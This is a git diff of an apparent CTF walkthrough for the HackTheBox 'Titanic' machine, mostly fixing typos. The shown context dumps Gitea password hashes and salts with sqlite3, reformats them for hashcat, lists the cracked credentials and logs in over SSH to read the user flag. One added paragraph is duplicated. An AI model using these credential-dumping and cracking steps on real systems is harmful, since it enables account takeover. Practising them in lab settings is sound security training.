@@ -12,8 +12,6 @@
 
 ## Recon
 
-## Recon
-
 Let's start by looking for open ports with an nmap scan.
 
 ```
@@ -287,7 +285,7 @@ sqlite3 gitea.db 'SELECT lower_name, passwd, salt FROM user;'>users1.txt
 
 ![](./.images/Screenshot-Titanic_Initial-25.png)
 
-Nice. We'll want this format for later to figure out which password belongs to who. Now are are going to remove the usernames from the hashes.
+Nice. We'll want to save this format for later use. It will be helpful in figuring out which password belongs to who. For now we are going to remove the usernames from the hashes.
 
 ```
 cat users1.txt|awk -F '|' '{print$2"|"$3}'>users1-preped.txt
@@ -295,7 +293,7 @@ cat users1.txt|awk -F '|' '{print$2"|"$3}'>users1-preped.txt
 
 ![](./.images/Screenshot-Titanic_Initial-26.png)
 
-### Step 2. Download the tool and user it
+### Step 2. Download the tool and use it
 
 The tool comes from the [hashcat github](https://github.com/unix-ninja/hashcat/blob/master/tools/gitea2hashcat.py) repo. So let's grab that.
 
@@ -342,3 +340,33 @@ Lining the hashes up looks kind of like:
 |  developer  |e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56\|8bf3e3452b78544f8bee9400d6936d34|i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=|25282528|
 |   username  |f705318c9983a02e5bc35b9ad752318022e1447a7429c5b7eb7c1fc0fc7300e769f6e21fe1ab23c61c52212ed595334012dd\|9b4ed59164c98d94917baa2916b54964|m07VkWTJjZSRe6opFrVJZA==:9wUxjJmDoC5bw1ua11IxgCLhRHp0KcW363wfwPxzAOdp9uIf4asjxhxSIS7VlTNAEt0=|password|
 
+I'd say two out of three is not bad. Going back to the etc/passwd file it mentions that there is a user named developer with a login. So we can try to ssh in.
+
+```
+ssh developer@titanic.htb
+```
+
+![]()
+I'd say two out of three is not bad. Going back to the etc/passwd file it mentions that there is a user named developer with a login. So we can try to ssh in.
+
+```
+ssh developer@titanic.htb
+```
+
+![](./.images/Screenshot-Titanic_Initial-31.png)
+
+![](https://media1.tenor.com/m/L942HwJ-GSoAAAAd/thematrixreloaded-matrix.gif)
+
+## Getting the user flag
+
+Another not very fun user flag.
+
+```
+cat users.txt
+```
+
+![](./.images/Screenshot-Titanic_User-1.png)
+
+## Getting the root flag
+
+![](https://media1.tenor.com/m/lduU0xA3eKAAAAAd/dbz.gif)
